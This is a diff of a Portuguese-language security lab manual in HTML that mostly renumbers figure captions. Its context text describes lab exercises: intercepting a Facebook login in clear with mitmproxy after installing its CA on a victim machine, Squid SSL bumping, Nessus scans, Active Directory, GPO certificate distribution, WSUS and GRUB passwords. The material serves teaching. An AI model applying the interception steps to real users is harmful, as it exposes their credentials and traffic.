 <p>Finalmente, clique em <em>Avançar</em> e em seguida em <em>Concluir</em>. Agora, o certificado do <code>mitmproxy</code> é reconhecido como um AC Raiz pelo sistema Windows. Num cenário real, o atacante teria que descobrir algum vetor de ataque <em>client-side</em> que permitisse a ele ter o acesso para copiar o certificado e instalá-lo na máquina da vítima. Aqui, como estamos em um ambiente simulado, pudemos contar com a "colaboração" do usuário-alvo.</p>
@@ -7019,7 +7380,7 @@ rtt min/avg/max/mdev = 0.451/0.451/0.451/0.000 ms</pre>
 <div class="content">
 <img src="./img/mitmproxy-password.png" alt="mitmproxy password">
 </div>
-<div class="title">Figure 80. Credenciais em claro no mitmweb</div>
+<div class="title">Figure 81. Credenciais em claro no mitmweb</div>
 </div>
 <div class="paragraph">
 <p>Em parelelo, na janela do navegador na máquina <em>WinClient-G</em>, o login no Facebook é concluído com sucesso:</p>
@@ -7028,7 +7389,7 @@ rtt min/avg/max/mdev = 0.451/0.451/0.451/0.000 ms</pre>
 <div class="content">
 <img src="./img/mitmproxy-fblogin.png" alt="mitmproxy fblogin">
 </div>
-<div class="title">Figure 81. Login no facebook através do mitmproxy</div>
+<div class="title">Figure 82. Login no facebook através do mitmproxy</div>
 </div>
 </li>
 <li>
@@ -7281,7 +7642,7 @@ refresh_pattern .                    0  20%    4320</code></pre>
 <div class="content">
 <img src="./img/squid-bump.png" alt="squid bump">
 </div>
-<div class="title">Figure 82. Acesso via Squid/Bump a <a href="https://twitter.com" class="bare">https://twitter.com</a></div>
+<div class="title">Figure 83. Acesso via Squid/Bump a <a href="https://twitter.com" class="bare">https://twitter.com</a></div>
 </div>
 <div class="paragraph">
 <p>Agora, acesse um dos websites cujo domínio consta no arquivo <code>/usr/local/etc/whitelist.txt</code>, e verifique sua cadeia certificadora: a AC que assina o certificado será a original, inalterada pelo proxy. Veja abaixo um acesso a <a href="https://www.bb.com.br" class="bare">https://www.bb.com.br</a> :</p>
@@ -7290,7 +7651,7 @@ refresh_pattern .                    0  20%    4320</code></pre>
 <div class="content">
 <img src="./img/squid-splice.png" alt="squid splice">
 </div>
-<div class="title">Figure 83. Acesso via Squid/Splice a <a href="https://www.bb.com.br" class="bare">https://www.bb.com.br</a></div>
+<div class="title">Figure 84. Acesso via Squid/Splice a <a href="https://www.bb.com.br" class="bare">https://www.bb.com.br</a></div>
 </div>
 </li>
 <li>
@@ -7707,7 +8068,7 @@ reneg-sec 60</code></pre>
 <div class="content">
 <img src="./img/ovpn-folder.png" alt="ovpn folder">
 </div>
-<div class="title">Figure 84. Estado final da pasta do OpenVPN na máquina WinClient-G</div>
+<div class="title">Figure 85. Estado final da pasta do OpenVPN na máquina WinClient-G</div>
 </div>
 </li>
 <li>
@@ -8175,7 +8536,7 @@ Processing triggers for systemd (238-4) ...</pre>
 <div class="content">
 <img src="./img/nessus-console.png" alt="nessus console">
 </div>
-<div class="title">Figure 85. Console do Nessus</div>
+<div class="title">Figure 86. Console do Nessus</div>
 </div>
 </li>
 </ol>
@@ -8277,7 +8638,7 @@ Processing triggers for systemd (238-4) ...</pre>
 <div class="content">
 <img src="./img/nessus-linserver1.png" alt="nessus linserver1">
 </div>
-<div class="title">Figure 86. Scan inicial do LinServer-G-Debian8 no Nessus</div>
+<div class="title">Figure 87. Scan inicial do LinServer-G-Debian8 no Nessus</div>
 </div>
 <div class="paragraph">
 <p>Aguarde o final do <em>scan</em>, e confira o resultado. Se quiser acompanhar o <em>scan</em> enquanto ele é realizado, clique na linha para expandi-la.</p>
@@ -8289,7 +8650,7 @@ Processing triggers for systemd (238-4) ...</pre>
 <div class="content">
 <img src="./img/nessus-linserver2.png" alt="nessus linserver2">
 </div>
-<div class="title">Figure 87. Primeiro scan do LinServer-G-Debian8 no Nessus</div>
+<div class="title">Figure 88. Primeiro scan do LinServer-G-Debian8 no Nessus</div>
 </div>
 <div class="paragraph">
 <p>Veja que há um grande número de vulnerabilidades identificadas: 6 críticas, 43 de alto impacto, 34 de médio impacto, 4 de baixo impacto e 48 de cunho informativo. Entre na aba <em>Vulnerabilities</em> e explore algumas dessas vulnerabilidades&#8201;&#8212;&#8201;por exemplo, confira abaixo a vulnerabilidade DSA-3481-1, referente à <code>glibc</code>:</p>
@@ -8298,7 +8659,7 @@ Processing triggers for systemd (238-4) ...</pre>
 <div class="content">
 <img src="./img/nessus-linserver3.png" alt="nessus linserver3">
 </div>
-<div class="title">Figure 88. Vulnerabilidade crítica da glibc</div>
+<div class="title">Figure 89. Vulnerabilidade crítica da glibc</div>
 </div>
 <div class="paragraph">
 <p>O Nessus apresenta várias informações úteis, como a natureza da vulnerabilidade, quais CVEs (<em>Common Vulnerabilities and Exposures</em>) são relevantes, e quais são as soluções mais indicadas. Do ponto de vista de gestão de riscos e vulnerabilidades em um parque com um grande número de máquinas instaladas, essas informações são importantíssimas.</p>
@@ -8334,7 +8695,7 @@ LinServer-A</pre>
 <div class="content">
 <img src="./img/nessus-linserver4.png" alt="nessus linserver4">
 </div>
-<div class="title">Figure 89. Scan do LinServer-G-Debian8 após atualização</div>
+<div class="title">Figure 90. Scan do LinServer-G-Debian8 após atualização</div>
 </div>
 <div class="paragraph">
 <p>Temos uma melhora notável: apenas 1 vulnerabilidade crítica e 3 de alto impacto foram identificadas, um cenário muito menos preocupante que o que tínhamos anteriormente.</p>
@@ -8419,7 +8780,7 @@ LinServer-A</pre>
 <div class="content">
 <img src="./img/nessus-winserver1.png" alt="nessus winserver1">
 </div>
-<div class="title">Figure 90. Primeiro scan do WinServer-G no Nessus</div>
+<div class="title">Figure 91. Primeiro scan do WinServer-G no Nessus</div>
 </div>
 <div class="paragraph">
 <p>Veja que há um enorme número de vulnerabilidades identificadas: 25 críticas, 327 de alto impacto, 81 de médio impacto, 7 de baixo impacto e 159 de cunho informativo. Entre na aba <em>Vulnerabilities</em> e explore algumas dessas vulnerabilidades.</p>
@@ -8434,7 +8795,7 @@ LinServer-A</pre>
 <div class="content">
 <img src="./img/nessus-winserver2.png" alt="nessus winserver2">
 </div>
-<div class="title">Figure 91. Scan do MBSA na máquina WinServer-G</div>
+<div class="title">Figure 92. Scan do MBSA na máquina WinServer-G</div>
 </div>
 <div class="paragraph">
 <p>Após o final do <em>scan</em>, vários apontamentos serão indicados pelo MBSA, como se segue:</p>
@@ -8443,7 +8804,7 @@ LinServer-A</pre>
 <div class="content">
 <img src="./img/nessus-winserver3.png" alt="nessus winserver3">
 </div>
-<div class="title">Figure 92. Resultados do scan do MBSA na máquina WinServer-G</div>
+<div class="title">Figure 93. Resultados do scan do MBSA na máquina WinServer-G</div>
 </div>
 <div class="paragraph">
 <p>Desses, o mais preocupante é de longe o grande número de atualizações de segurança pendentes: 205. Ainda há alertas quanto à falta de atualizações automáticas, expiração de senhas de usuários e situação do <em>Windows Firewall</em>.</p>
@@ -8455,7 +8816,7 @@ LinServer-A</pre>
 <div class="content">
 <img src="./img/nessus-winserver4.png" alt="nessus winserver4">
 </div>
-<div class="title">Figure 93. WinServer-G atualizado</div>
+<div class="title">Figure 94. WinServer-G atualizado</div>
 </div>
 <div class="paragraph">
 <p>Após o final do processo, a tela do <em>Windows Update</em> deve mostrar a mensagem acima.</p>
@@ -8467,7 +8828,7 @@ LinServer-A</pre>
 <div class="content">
 <img src="./img/nessus-winserver5.png" alt="nessus winserver5">
 </div>
-<div class="title">Figure 94. Scan final do WinServer-G no Nessus</div>
+<div class="title">Figure 95. Scan final do WinServer-G no Nessus</div>
 </div>
 <div class="paragraph">
 <p>A diferença para o panorama anterior é significativa: agora temos apenas 7 vulnerabilidades de médio impacto, 2 de baixo impacto e 27 de cunho informativo. De fato, as recomendações do MBSA e as atualizações de sistema fizeram uma diferença importante na segurança do sistema.</p>
@@ -8552,7 +8913,7 @@ LinServer-A</pre>
 <div class="content">
 <img src="./img/nessus-fwgw1.png" alt="nessus fwgw1">
 </div>
-<div class="title">Figure 95. Primeiro scan do FWGW1-G-Debian8 no Nessus</div>
+<div class="title">Figure 96. Primeiro scan do FWGW1-G-Debian8 no Nessus</div>
 </div>
 <div class="paragraph">
 <p>Um resultado impressionante: apenas 6 vulnerabilidades informativas. Mas, será mesmo?</p>
@@ -8595,7 +8956,7 @@ Chain OUTPUT (policy ACCEPT 20 packets, 1568 bytes)
 <div class="content">
 <img src="./img/nessus-fwgw2.png" alt="nessus fwgw2">
 </div>
-<div class="title">Figure 96. Segundo scan do FWGW1-G-Debian8 no Nessus</div>
+<div class="title">Figure 97. Segundo scan do FWGW1-G-Debian8 no Nessus</div>
 </div>
 <div class="paragraph">
 <p>Agora temos uma vulnerabilidade de alto impacto, duas de médio impacto e 23 informativas. Talvez o servidor não esteja tão seguro quando imaginávamos&#8230;&#8203; vamos tentar ir mais a fundo.</p>
@@ -8639,7 +9000,7 @@ Chain OUTPUT (policy ACCEPT 20 packets, 1568 bytes)
 <div class="content">
 <img src="./img/nessus-fwgw3.png" alt="nessus fwgw3">
 </div>
-<div class="title">Figure 97. Scan final do FWGW1-G-Debian8 no Nessus</div>
+<div class="title">Figure 98. Scan final do FWGW1-G-Debian8 no Nessus</div>
 </div>
 <div class="paragraph">
 <p>Com o login <code>ssh</code> ativado, o Nessus conseguiu, agora sim, encontrar 6 vulnerabilidades críticas, 44 de alto impacto, 36 de médio impacto, 4 de baixo impacto e 54 informativas. De fato, a segurança do servidor <em>FWGW1-G-Debian8</em> está no mesmo patamar da máquina <em>LinServer-G-Debian8</em> antes da sua atualização, o que seria esperado.</p>
@@ -8772,7 +9133,7 @@ Chain OUTPUT (policy ACCEPT 20 packets, 1568 bytes)
 <div class="content">
 <img src="./img/ad1.png" alt="ad1">
 </div>
-<div class="title">Figure 98. Tela inicial de configuração do AD DC</div>
+<div class="title">Figure 99. Tela inicial de configuração do AD DC</div>
 </div>
 <div class="paragraph">
 <p>Marque a opção <em>Use advanced mode installation</em> e clique em <em>Next</em>.</p>
@@ -8787,7 +9148,7 @@ Chain OUTPUT (policy ACCEPT 20 packets, 1568 bytes)
 <div class="content">
 <img src="./img/ad2.png" alt="ad2">
 </div>
-<div class="title">Figure 99. Escolha de tipo de instalação do AD DC</div>
+<div class="title">Figure 100. Escolha de tipo de instalação do AD DC</div>
 </div>
 <div style="page-break-after: always;"></div>
 </li>
@@ -8797,7 +9158,7 @@ Chain OUTPUT (policy ACCEPT 20 packets, 1568 bytes)
 <div class="content">
 <img src="./img/ad3.png" alt="ad3">
 </div>
-<div class="title">Figure 100. Escolha do FQDN do AD DC</div>
+<div class="title">Figure 101. Escolha do FQDN do AD DC</div>
 </div>
 </li>
 <li>
@@ -8810,7 +9171,7 @@ Chain OUTPUT (policy ACCEPT 20 packets, 1568 bytes)
 <div class="content">
 <img src="./img/ad4.png" alt="ad4">
 </div>
-<div class="title">Figure 101. Escolha do nível funcional da floresta AD DC</div>
+<div class="title">Figure 102. Escolha do nível funcional da floresta AD DC</div>
 </div>
 <div style="page-break-after: always;"></div>
 </li>
@@ -8823,7 +9184,7 @@ Chain OUTPUT (policy ACCEPT 20 packets, 1568 bytes)
 <div class="content">
 <img src="./img/ad5.png" alt="ad5">
 </div>
-<div class="title">Figure 102. Erro na delegação DNS do AD DC</div>
+<div class="title">Figure 103. Erro na delegação DNS do AD DC</div>
 </div>
 <div class="paragraph">
 <p>Após ler a mensagem de aviso, clique em <em>Yes</em> para continuar.</p>
@@ -8839,7 +9200,7 @@ Chain OUTPUT (policy ACCEPT 20 packets, 1568 bytes)
 <div class="content">
 <img src="./img/ad6.png" alt="ad6">
 </div>
-<div class="title">Figure 103. Definição da senha do modo de recuperação do AD DC</div>
+<div class="title">Figure 104. Definição da senha do modo de recuperação do AD DC</div>
 </div>
 </li>
 <li>
@@ -8897,7 +9258,7 @@ Chain OUTPUT (policy ACCEPT 20 packets, 1568 bytes)
 <div class="content">
 <img src="./img/adports.png" alt="adports">
 </div>
-<div class="title">Figure 104. Portas conhecidas para liberação do AD no firewall</div>
+<div class="title">Figure 105. Portas conhecidas para liberação do AD no firewall</div>
 </div>
 <div class="paragraph">
 <p>Considerando o grande número de portas em questão, iremos permitir a faixa completa de conexão entre as máquinas <em>WinServer-G</em> e <em>WinClient-G</em>, para facilitar a configuração neste laboratório.</p>
@@ -8946,7 +9307,7 @@ root</pre>
 <div class="content">
 <img src="./img/adclient1.png" alt="adclient1">
 </div>
-<div class="title">Figure 105. Configuração DNS do cliente AD</div>
+<div class="title">Figure 106. Configuração DNS do cliente AD</div>
 </div>
 </li>
 <li>
@@ -8955,7 +9316,7 @@ root</pre>
 <div class="content">
 <img src="./img/adclient2.png" alt="adclient2">
 </div>
-<div class="title">Figure 106. Inserindo o cliente AD no domínio</div>
+<div class="title">Figure 107. Inserindo o cliente AD no domínio</div>
 </div>
 <div class="paragraph">
 <p>Clique em <em>OK</em>. O sistema irá exigir autenticação&#8201;&#8212;&#8201;você deve usar um usuário com permissões <strong>administrativas</strong> no AD DC, como o usuário <code>Administrator</code>. Informe, também, o domínio de autenticação do usuário. Trocando em miúdos, autentique-se como:</p>
@@ -8981,7 +9342,7 @@ root</pre>
 <div class="content">
 <img src="./img/adclient3.png" alt="adclient3">
 </div>
-<div class="title">Figure 107. Inserção do cliente AD no domínio com sucesso</div>
+<div class="title">Figure 108. Inserção do cliente AD no domínio com sucesso</div>
 </div>
 <div class="paragraph">
 <p>Reinicie a máquina <em>WinClient-G</em> para concluir o processo.</p>
@@ -9014,7 +9375,7 @@ root</pre>
 <div class="content">
 <img src="./img/aduser1.png" alt="aduser1">
 </div>
-<div class="title">Figure 108. Interface de edição de usuários e máquinas do AD</div>
+<div class="title">Figure 109. Interface de edição de usuários e máquinas do AD</div>
 </div>
 </li>
 <li>
@@ -9023,7 +9384,7 @@ root</pre>
 <div class="content">
 <img src="./img/aduser2.png" alt="aduser2">
 </div>
-<div class="title">Figure 109. Visão de usuários e grupos existentes no AD</div>
+<div class="title">Figure 110. Visão de usuários e grupos existentes no AD</div>
 </div>
 <div class="paragraph">
 <p>De igual forma, para ver os computadores adicionados ao AD, basta clicar sobre a pasta <em>Computers</em>.</p>
@@ -9070,7 +9431,7 @@ root</pre>
 <div class="content">
 <img src="./img/aduser3.png" alt="aduser3">
 </div>
-<div class="title">Figure 110. Confirmação de adição de usuário ao AD</div>
+<div class="title">Figure 111. Confirmação de adição de usuário ao AD</div>
 </div>
 </li>
 <li>
@@ -9079,7 +9440,7 @@ root</pre>
 <div class="content">
 <img src="./img/adlogon1.png" alt="adlogon1">
 </div>
-<div class="title">Figure 111. Logon inicial no AD</div>
+<div class="title">Figure 112. Logon inicial no AD</div>
 </div>
 <div class="paragraph">
 <p>Imediatamente, o AD reporta que a senha deve ser alterada no primeiro logon&#8201;&#8212;&#8201;isso faz sentido, pois mantivemos a caixa <em>User must change password at next logon</em> marcada quando da criação do usuário no passo (4). Escolha uma nova senha, diferente da primeira e igualmente complexa (sugestão: <code>Seg2@rnp!</code>), e confirme o logon.</p>
@@ -9091,7 +9452,7 @@ root</pre>
 <div class="content">
 <img src="./img/adlogon2.png" alt="adlogon2">
 </div>
-<div class="title">Figure 112. Verificação de logon no AD</div>
+<div class="title">Figure 113. Verificação de logon no AD</div>
 </div>
 </li>
 </ol>
@@ -9146,7 +9507,7 @@ root</pre>
 <div class="content">
 <img src="./img/gpo1.png" alt="gpo1">
 </div>
-<div class="title">Figure 113. Detecção de certificado forjado não-confiável na máquina WinClient-G</div>
+<div class="title">Figure 114. Detecção de certificado forjado não-confiável na máquina WinClient-G</div>
 </div>
 </li>
 <li>
@@ -9158,7 +9519,7 @@ root</pre>
 <div class="content">
 <img src="./img/gpo2.png" alt="gpo2">
 </div>
-<div class="title">Figure 114. Cópia do certificado da CA do Squid para a máquina WinServer-G</div>
+<div class="title">Figure 115. Cópia do certificado da CA do Squid para a máquina WinServer-G</div>
 </div>
 </li>
 <li>
@@ -9167,7 +9528,7 @@ root</pre>
 <div class="content">
 <img src="./img/gpo3.png" alt="gpo3">
 </div>
-<div class="title">Figure 115. Ferramenta para gestão de políticas no AD</div>
+<div class="title">Figure 116. Ferramenta para gestão de políticas no AD</div>
 </div>
 </li>
 <li>
@@ -9176,7 +9537,7 @@ root</pre>
 <div class="content">
 <img src="./img/gpo4.png" alt="gpo4">
 </div>
-<div class="title">Figure 116. Criação de nova GPO</div>
+<div class="title">Figure 117. Criação de nova GPO</div>
 </div>
 </li>
 <li>
@@ -9185,7 +9546,7 @@ root</pre>
 <div class="content">
 <img src="./img/gpo5.png" alt="gpo5">
 </div>
-<div class="title">Figure 117. Navegando na tela de edição de políticas</div>
+<div class="title">Figure 118. Navegando na tela de edição de políticas</div>
 </div>
 </li>
 <li>
@@ -9194,7 +9555,7 @@ root</pre>
 <div class="content">
 <img src="./img/gpo6.png" alt="gpo6">
 </div>
-<div class="title">Figure 118. Certificado do Squid adicionado à GPO</div>
+<div class="title">Figure 119. Certificado do Squid adicionado à GPO</div>
 </div>
 </li>
 <li>
@@ -9203,7 +9564,7 @@ root</pre>
 <div class="content">
 <img src="./img/gpo7.png" alt="gpo7">
 </div>
-<div class="title">Figure 119. Forçando atualização de GPOs imediatamente</div>
+<div class="title">Figure 120. Forçando atualização de GPOs imediatamente</div>
 </div>
 </li>
 <li>
@@ -9212,7 +9573,7 @@ root</pre>
 <div class="content">
 <img src="./img/gpo8.png" alt="gpo8">
 </div>
-<div class="title">Figure 120. Detecção de certificado da CA do Squid como confiável</div>
+<div class="title">Figure 121. Detecção de certificado da CA do Squid como confiável</div>
 </div>
 </li>
 <li>
@@ -9221,7 +9582,7 @@ root</pre>
 <div class="content">
 <img src="./img/gpo9.png" alt="gpo9">
 </div>
-<div class="title">Figure 121. Certificado da CA do Squid adicionado à lista de certificadoras raiz confiáveis</div>
+<div class="title">Figure 122. Certificado da CA do Squid adicionado à lista de certificadoras raiz confiáveis</div>
 </div>
 <div class="paragraph">
 <p>Com efeito, nossa configuração via GPO funcionou corretamente&#8201;&#8212;&#8201;em um cenário com dezenas de clientes Windows, ou mesmo centenas, você poderia usar um esquema de configuração como este para distribuir o certificado do seu <em>proxy</em> de forma imediata.</p>
@@ -9254,7 +9615,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus1.png" alt="wsus1">
 </div>
-<div class="title">Figure 122. Máquina WinServer-G atualizada</div>
+<div class="title">Figure 123. Máquina WinServer-G atualizada</div>
 </div>
 </li>
 <li>
@@ -9310,7 +9671,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus2.png" alt="wsus2">
 </div>
-<div class="title">Figure 123. Instalação das dependências do WSUS</div>
+<div class="title">Figure 124. Instalação das dependências do WSUS</div>
 </div>
 <div class="paragraph">
 <p>Confirme que suas seleções estão corretas e clique em <em>Next</em>, e em seguida em <em>Install</em>.</p>
@@ -9331,7 +9692,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus-disk1.png" alt="wsus disk1">
 </div>
-<div class="title">Figure 124. Inicialização do disco para o WSUS</div>
+<div class="title">Figure 125. Inicialização do disco para o WSUS</div>
 </div>
 <div class="paragraph">
 <p>Mantenha marcada a caixa <em>MBR (Master Boot Record)</em> e clique em <em>OK</em>. Em seguida, clique com o botão direito no novo disco (o nome dele deve ser <em>Disk 1</em>), e selecione <em>New Simple Volume&#8230;&#8203;</em>.</p>
@@ -9372,7 +9733,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus-disk2.png" alt="wsus disk2">
 </div>
-<div class="title">Figure 125. Formatação do volume para o WSUS</div>
+<div class="title">Figure 126. Formatação do volume para o WSUS</div>
 </div>
 <div class="paragraph">
 <p>Clique em <em>Finish</em>. Ao final do processo, feche a janela do <em>Disk Management</em> e verifique que o novo volume <code>K:</code>, com <em>label</em> <code>WSUS</code>, está disponível no <em>Windows Explorer</em>.</p>
@@ -9384,7 +9745,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus3.png" alt="wsus3">
 </div>
-<div class="title">Figure 126. Instalação do WSUS</div>
+<div class="title">Figure 127. Instalação do WSUS</div>
 </div>
 </li>
 <li>
@@ -9402,7 +9763,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus4.png" alt="wsus4">
 </div>
-<div class="title">Figure 127. Pasta de download dos arquivos de update do WSUS</div>
+<div class="title">Figure 128. Pasta de download dos arquivos de update do WSUS</div>
 </div>
 </li>
 <li>
@@ -9417,7 +9778,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus5.png" alt="wsus5">
 </div>
-<div class="title">Figure 128. Revisão das opções de instalação do WSUS</div>
+<div class="title">Figure 129. Revisão das opções de instalação do WSUS</div>
 </div>
 <div class="paragraph">
 <p>Aguarde o processo de instalação do WSUS. Ao final, clique em <em>Finish</em>.</p>
@@ -9429,7 +9790,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus6.png" alt="wsus6">
 </div>
-<div class="title">Figure 129. Configuração do WSUS</div>
+<div class="title">Figure 130. Configuração do WSUS</div>
 </div>
 </li>
 <li>
@@ -9447,7 +9808,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus7.png" alt="wsus7">
 </div>
-<div class="title">Figure 130. Atualização da base de updates do WSUS</div>
+<div class="title">Figure 131. Atualização da base de updates do WSUS</div>
 </div>
 <div class="paragraph">
 <p>Ao final do procedimento, clique em <em>Next</em>.</p>
@@ -9462,7 +9823,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus8.png" alt="wsus8">
 </div>
-<div class="title">Figure 131. Escolha de produtos para download de atualizações</div>
+<div class="title">Figure 132. Escolha de produtos para download de atualizações</div>
 </div>
 </li>
 <li>
@@ -9483,7 +9844,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus9.png" alt="wsus9">
 </div>
-<div class="title">Figure 132. Console administrativa do WSUS</div>
+<div class="title">Figure 133. Console administrativa do WSUS</div>
 </div>
 <div class="paragraph">
 <p>Para verificar o estado da sincronização iniciada no passo (22), navegue para <em>WINSERVER-G</em> &gt; <em>Synchronizations</em>. Ao final da sincronização você deverá ver o processo concluído com sucesso, como se segue:</p>
@@ -9492,7 +9853,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus10.png" alt="wsus10">
 </div>
-<div class="title">Figure 133. Sincronização do WSUS realizada com sucesso</div>
+<div class="title">Figure 134. Sincronização do WSUS realizada com sucesso</div>
 </div>
 <div class="paragraph">
 <p>Finalmente, feche a console de configuração do <em>Windows Server Update Services</em>.</p>
@@ -9534,7 +9895,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus-gpo1.png" alt="wsus gpo1">
 </div>
-<div class="title">Figure 134. Criação de política para o WSUS</div>
+<div class="title">Figure 135. Criação de política para o WSUS</div>
 </div>
 </li>
 <li>
@@ -9563,7 +9924,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus-gpo2.png" alt="wsus gpo2">
 </div>
-<div class="title">Figure 135. Configuração de atualizações automáticas via GPO</div>
+<div class="title">Figure 136. Configuração de atualizações automáticas via GPO</div>
 </div>
 <div class="paragraph">
 <p>Clique em <em>OK</em>.</p>
@@ -9592,7 +9953,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus-gpo3.png" alt="wsus gpo3">
 </div>
-<div class="title">Figure 136. Configuração de servidor remoto para download de atualizações</div>
+<div class="title">Figure 137. Configuração de servidor remoto para download de atualizações</div>
 </div>
 <div class="paragraph">
 <p>Clique em <em>OK</em>.</p>
@@ -9607,7 +9968,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus-gpo4.png" alt="wsus gpo4">
 </div>
-<div class="title">Figure 137. WinClient-G verificando se existem novas atualizações</div>
+<div class="title">Figure 138. WinClient-G verificando se existem novas atualizações</div>
 </div>
 <div class="paragraph">
 <p>Ao final do processo, a máquina irá reportar-se como atualizada. Isso é parcialmente verdade, como veremos a seguir.</p>
@@ -9619,7 +9980,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus-gpo5.png" alt="wsus gpo5">
 </div>
-<div class="title">Figure 138. Status de atualização da máquina WinClient-G</div>
+<div class="title">Figure 139. Status de atualização da máquina WinClient-G</div>
 </div>
 <div class="paragraph">
 <p>Observe que a máquina <em>WinClient-G</em> possui 2369 atualizações realizadas e 273 ainda não aplicadas, e com o <em>service pack</em> 1 instalado. No WSUS, a gestão de atualizações é feita de forma centralizada pelo administrador&#8201;&#8212;&#8201;pode-se agrupar máquinas em grupos de trabalho, e habilitar/desabilitar atualizações pontualmente para essas máquinas e grupos. Para gerenciar a aprovação de atualizações, navegue para <em>WINSERVER-A</em> &gt; <em>Updates</em> &gt; <em>All Updates</em>. Ajuste o filtro para condição <em>Unapproved</em> e estado <em>Failed or Needed</em>, e clique em <em>Refresh</em>. Você deverá ver algo semelhante a tela a seguir:</p>
@@ -9628,7 +9989,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus-gpo6.png" alt="wsus gpo6">
 </div>
-<div class="title">Figure 139. Aprovação de atualizações no WSUS, parte 1</div>
+<div class="title">Figure 140. Aprovação de atualizações no WSUS, parte 1</div>
 </div>
 <div class="paragraph">
 <p>Aprove todas as atualizações. Selecione-as usando SHIFT e no painel direito, clique em <em>Actions</em> &gt; <em>Update</em> &gt; <em>Approve&#8230;&#8203;</em>. Na nova janela, clique no quadrado à esquerda de <em>All Computers</em> e marque <em>Approved for Install</em>; faça o mesmo para o grupo abaixo, <em>Unassigned Computers</em>, e clique em <em>OK</em>. O WSUS iniciará o processo de aprovação das atualizações, como mostrado abaixo:</p>
@@ -9637,7 +9998,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus-gpo7.png" alt="wsus gpo7">
 </div>
-<div class="title">Figure 140. Aprovação de atualizações no WSUS, parte 2</div>
+<div class="title">Figure 141. Aprovação de atualizações no WSUS, parte 2</div>
 </div>
 <div class="paragraph">
 <p>Ao final do processo, clique em <em>Close</em>.</p>
@@ -9649,7 +10010,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus-gpo8.png" alt="wsus gpo8">
 </div>
-<div class="title">Figure 141. Novas atualizações aprovadas pelo WSUS disponibilizadas</div>
+<div class="title">Figure 142. Novas atualizações aprovadas pelo WSUS disponibilizadas</div>
 </div>
 <div class="paragraph">
 <p>Um vez aprovadas na console administrativa do WSUS, as atualizações podem ser instaladas nas máquinas cliente. Assim, o administrador pode controlar de forma granular quais atualizações distribuir, para quais máquinas, e quando deseja que elas sejam instaladas, tornando o processo de gestão de segurança do parque computacional muito mais eficiente.</p>
@@ -9813,7 +10174,7 @@ done</pre>
 <div class="content">
 <img src="./img/grub-passwd1.png" alt="grub passwd1">
 </div>
-<div class="title">Figure 142. Edição de opções no GRUB</div>
+<div class="title">Figure 143. Edição de opções no GRUB</div>
 </div>
 <div class="paragraph">
 <p>Apertando <code>e</code> sobre a primeira opção, imediatamente o sistema requisita a combinação usuário/senha configurada anteriormente:</p>
@@ -9822,7 +10183,7 @@ done</pre>
 <div class="content">
 <img src="./img/grub-passwd2.png" alt="grub passwd2">
 </div>
-<div class="title">Figure 143. Inserção de usuário/senha no GRUB</div>
+<div class="title">Figure 144. Inserção de usuário/senha no GRUB</div>
 </div>
 <div class="paragraph">
 <p>Mediante a inserção da combinação correta, o menu de edição de opções de <em>boot</em> é mostrado, como se segue.</p>
@@ -9831,7 +10192,7 @@ done</pre>
 <div class="content">
 <img src="./img/grub-passwd3.png" alt="grub passwd3">
 </div>
-<div class="title">Figure 144. Edição de opções de boot no GRUB</div>
+<div class="title">Figure 145. Edição de opções de boot no GRUB</div>
 </div>
 <div class="paragraph">
 <p>Note, ainda, que mesmo o <em>boot</em> do sistema prossegue apenas se a combinação de usuário/senha correta é inserida no GRUB.</p>
